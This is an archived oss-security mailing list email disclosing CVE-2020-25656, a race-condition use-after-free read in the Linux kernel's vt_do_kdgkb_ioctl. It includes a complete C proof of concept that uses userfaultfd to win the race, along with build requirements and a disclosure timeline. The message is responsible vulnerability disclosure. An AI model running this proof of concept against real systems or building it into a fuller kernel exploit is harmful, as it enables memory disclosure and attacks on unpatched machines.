X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7393" "Friday" "16" "October" "2020" "11:39:34" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw@mail.gmail.com>" "219" "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" "^Cc:" nil nil "10" "2020101603:39:34" "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" (number mark "        yuanmingbuaa Oct 16  219/7393  " thread-indent "\"[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 30337 invoked by uid 550); 16 Oct 2020 06:05:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9226 invoked from network); 16 Oct 2020 03:39:53 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=iNf5mJT6lyZAV2fZLXiwTzoQhCNBap+G1oFujDAQw1s=;
        b=IuEs66essDpksu0JLO1rzvtPFJsKIdEevvNXh9gUaCF7DOL7vuBJJiFyb1TB6XbRFl
         xxxAViHbqzBd82U+Epam4gLOXGEe0Zsa3OdODZQpXjQ8ZL/xWtoA8OT37vuHiI3z2jdu
         lsFw0PxXxLsvbTPHqkaq+DlKSKEHf9xII/DQU7B+PMozLaV4MgOe7emdfooAmCpUwgcd
         Yc17utg6wTXn5FQUxplcn/HCOKcoHF2L56ghtR7JAaAqjSdGGSivjhf2pMBmeWiYFPa8
         2//thfzAkvtMnom5hhQnts/saRPNd7quBDYWDPmG87O7xIObUfFLadp+JaEqIzQT12Y0
         w2cw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=iNf5mJT6lyZAV2fZLXiwTzoQhCNBap+G1oFujDAQw1s=;
        b=TJwwJiGl7w2lvbWWapuB48+uUTZvVaLa3SeW4d1RVoCCVyEn8nIvNqotVoBmOkvPza
         JTrbjz+ZgzedrcGd5VJp0NIgDc923l9Taq3nYtAkzkjcBYO2AGNdYlnc+uI+pc5+jaS1
         rQNIKAB/3Juac0iRpUIos6gzSA1Lsx/gjA/IDyeEGz3+HKQmlN2ukzctteTXZ7BXO1iQ
         DCUaCwYEQOkCPAoLpmbAtj0x3I+wbEf9yczXCLYhoaXhhvQeSJnrgm4/A6pNsngaU3wd
         CNeT4LvK1k+AjfMg61nTP2oHZNe9CqJo+MZAVCC5hTooQCq29XNxR8OKOdejUqOp3RJq
         LD6w==
X-Gm-Message-State: AOAM531yb/tKPIutDpAxXAtTnYADv4GSIr5DiLiU7+P6ENloFWvzemDC
	Bn7QDZFl6DSJENY0Dw64oo0hLJ9Mawha2jQU8kprGCJtwdXPJw==
X-Google-Smtp-Source: ABdhPJwYY9rRNhLNGIfVErQ+MGCKka+AMGGlkktBWbt6ir7qE7pdTWavU+BT+ywH26AAIVrSPYuBcfoTauDnMr+N6DQ=
X-Received: by 2002:a17:906:6545:: with SMTP id u5mr1676147ejn.346.1602819582004;
 Thu, 15 Oct 2020 20:39:42 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw@mail.gmail.com>
Content-Type: multipart/alternative; boundary="000000000000d311f305b1c183f7"
Cc: nopitydays@gmail.com
Date: Fri, 16 Oct 2020 11:39:34 +0800
From: Minh Yuan <yuanmingbuaa@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl
To: oss-security@lists.openwall.com

--000000000000d311f305b1c183f7
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi,

We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
version 3.4 to the latest version (v5.9 for now).

The root cause of this vulnerability is that there exits a race in
KDGKBSENT and KDSKBSENT.

Here are details:
1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
func_table, at the same time, due to KDGKBSENT has no lock, we can use
KDSKBSENT again to allocate a larger buffer than step1, and the old
funcbufptr will be freed. However, we've obtained the heap pointer in
KDGKBSENT, so a uaf read will happen while executing put_user.

I've successfully reproduced this bug in a special way.
However, to write a universal PoC for anyone else to reproduce it,  I use
userfaultfd to handle the order of "free" and "use" in multithreading
environment. This is my PoC:

// author by ziiiro@thu
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <linux/prctl.h>
#include <stdint.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

#define KDGKBSENT 0x4B48 /* gets one function key string entry */
#define KDSKBSENT 0x4B49 /* sets one function key string entry */

struct kbsentry {
unsigned char kb_func;
unsigned char kb_string[512];
};
int fd;
static int page_size;
static void *fault_handler_thread(void *arg) {
  unsigned long value;
  static struct uffd_msg msg;
  static int fault_cnt =3D 0;
  long uffd;
  static char *page =3D NULL;
  struct uffdio_copy uffdio_copy;
  int len, i;
  if (page =3D=3D NULL) {
    page =3D mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page =3D=3D MAP_FAILED) errExit("mmap (userfaultfd)");
  }
  uffd =3D (long)arg;

  for(;;) {
    struct pollfd pollfd;
    pollfd.fd =3D uffd;
    pollfd.events =3D POLLIN;
    len =3D poll(&pollfd, 1, -1);


    read(uffd, &msg, sizeof(msg));
    printf("    flags =3D 0x%lx\n", msg.arg.pagefault.flags);
    printf("    address =3D 0x%lx\n", msg.arg.pagefault.address);
    switch(fault_cnt) {
        case 0:
            puts("triggered in the first page!");
            break;
        case 1:
            puts("triggered in the seccond page!");
            munmap((void*)0x233000,page_size);
            void *addr =3D (void*)mmap((void*)0x233000,
                        page_size,
                        PROT_READ | PROT_WRITE,
                        MAP_FIXED | MAP_PRIVATE | MAP_ANON,
                        -1, 0);
            if ((unsigned long)addr !=3D 0x233000)
                errExit("mmap (0x233000)");
            // register 0x233000 again to trigger put_user
            struct uffdio_register uffdio_register;
            uffdio_register.range.start =3D (unsigned long)addr;
            uffdio_register.range.len   =3D page_size;
            uffdio_register.mode        =3D UFFDIO_REGISTER_MODE_MISSING;
            if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) =3D=3D -1)
                errExit("ioctl: UFFDIO_REGITER");
            break;
        case 2:
            puts("triggered in put_user!");
            struct kbsentry *kbs;
            kbs =3D malloc(sizeof(struct kbsentry));
            kbs->kb_func =3D 0;

strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
bbbbbbbbb");
            // free old funcbufptr
            ioctl(fd,KDSKBSENT,kbs);
            break;

    }
    // return to kernel-land
    uffdio_copy.src =3D (unsigned long)page;
    uffdio_copy.dst =3D (unsigned long)msg.arg.pagefault.address &
~(page_size - 1);
    uffdio_copy.len =3D page_size;
    uffdio_copy.mode =3D 0;
    uffdio_copy.copy =3D 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) =3D=3D -1)
        errExit("ioctl: UFFDIO_COPY");

    fault_cnt++;

  }
}
// use userfaultfd to handle free->use
void setup_pagefault(void *addr, unsigned size) {
  long uffd;
  pthread_t th;
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;
  // new userfaulfd

  uffd =3D syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd =3D=3D -1) errExit("userfaultfd");
  // enabled uffd object
  uffdio_api.api =3D UFFD_API;
  uffdio_api.features =3D 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) =3D=3D -1) errExit("ioctl:
UFFDIO_API");
  // register memory address
  uffdio_register.range.start =3D (unsigned long)addr;
  uffdio_register.range.len   =3D size;
  uffdio_register.mode        =3D UFFDIO_REGISTER_MODE_MISSING;
//UFFDIO_REGISTER_MODE_WP;//
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) =3D=3D -1) errExit("io=
ctl:
UFFDIO_REGITER");
  // monitor page fault
  s =3D pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
  if (s !=3D 0) errExit("pthread_create");
}


int main(int argc, char** argv)
{
        struct kbsentry *kbs;
        pthread_t th;
        page_size =3D sysconf(_SC_PAGE_SIZE);
        void *addr =3D (void*)mmap((void*)0x233000,
                            page_size * 2,
                            PROT_READ | PROT_WRITE,
                            MAP_FIXED | MAP_PRIVATE | MAP_ANON,
                            -1, 0);
        if ((unsigned long)addr !=3D 0x233000)
            errExit("mmap (0x233000)");
        setup_pagefault(addr, page_size * 2);
        kbs =3D malloc(sizeof(struct kbsentry));
        kbs->kb_func =3D 0;
        fd =3D open("/dev/tty1", O_RDONLY, 0);

strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
a");
        // allocate a lager funcbufptr
        ioctl(fd,KDSKBSENT,kbs);
        // use KDGKBSENT to access the new funcbufptr
        ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
        return 1;

}

Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=
=3Dy
is also needed. Besides, it needs the privilege to access tty to trigger
this bug.

We've noticed that this bug was also discovered by Syzbot 8 months ago, but
no one has successfully reproduced it (
https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
leaving this issue ignored and upatched yet. Hope this PoC can help
someone.

Timeline:
* 10.15.20 - Vulnerability reported to security@kernel.org and
linux-distros@vs.openwall.org.
* 10.15.20 - CVE-2020-25656 assigned.
* 10.16.20 - Vulnerability opened.

Thanks,
Yuan Ming and Bodong Zhao, Tsinghua University

--000000000000d311f305b1c183f7--
